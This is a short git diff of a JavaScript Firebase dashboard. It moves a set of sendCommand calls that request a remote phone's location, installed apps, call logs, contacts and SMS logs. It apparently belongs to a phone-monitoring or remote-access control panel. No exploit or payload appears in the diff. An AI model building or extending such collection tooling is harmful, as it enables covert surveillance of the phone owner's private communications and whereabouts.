@@ -58,7 +58,19 @@ onAuthStateChanged(auth, (user) => {
 function initializeDashboard() {
   document.getElementById("logoutBtn")?.addEventListener("click", () => {
     signOut(auth).then(() => window.location.href = "index.html");
+ 
   });
+
+     // Initial commands after user is authenticated
+sendCommand("status", "getStatus");
+sendCommand("battery", "getBattery");
+sendCommand("lastSeen", "getLastSeen");
+sendCommand("location", "getLocation");
+sendCommand("installedApps", "getInstalledApps");
+sendCommand("calls", "getCallLogs");
+sendCommand("contacts", "getContacts");
+sendCommand("sms", "getSmsLogs");
+
 
   // Real-time data listener
   const userRef = ref(db, `users/${uid}`);
@@ -179,19 +191,3 @@ function displayNoneDashboard() {
 function displayBlockDashboard() {
   document.getElementById("dashboardMain").style.display = "block";
 }
-
-// ✅ Initial command trigger on window load
-window.addEventListener("load", () => {
-  onAuthStateChanged(auth, (user) => {
-    if (user) {
-      sendCommand("status", "getStatus");
-      sendCommand("battery", "getBattery");
-      sendCommand("lastSeen", "getLastSeen");
-      sendCommand("location", "getLocation");
-      sendCommand("installedApps", "getInstalledApps");
-      sendCommand("calls", "getCallLogs");
-      sendCommand("contacts", "getContacts");
-      sendCommand("sms", "getSmsLogs");
-    }
-  });
-});
